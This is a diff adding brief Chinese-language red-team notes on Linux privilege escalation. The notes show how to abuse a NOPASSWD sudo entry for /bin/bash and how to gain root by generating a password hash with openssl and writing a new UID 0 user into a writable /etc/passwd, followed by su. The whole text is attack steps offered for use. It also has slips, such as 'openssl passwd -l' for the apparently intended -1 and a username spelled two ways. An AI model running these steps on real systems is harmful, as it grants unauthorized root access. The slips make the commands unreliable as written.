@@ -1,0 +1,17 @@
+使用 sudo -l
+出现（brexit）NOPASSWD: /bin/bash 表示给了brexit的bash权限
+使用 sudo -u berxit /bin/bash 提权（但可能不是root用户）
+
+如果brexit对/etc/passwd有读写权限则可以利用passwd提权到root用户
+使用 ls -liah /etc/passwd查看
+生成一个用户密码
+openssl passwd -l 123456
+查看root权限用户
+cat /etc/passwd | grep root
+显示
+root:x:0:0:root:/root:/bin/bash
+
+编辑一个新的root用户
+redteamnotes（随便编一个用户名）：生成的密码:0:0:root:/root:/bin/bash 
+写入到/etc/passwd之中
+使用 su redteamnotes切换用户提权
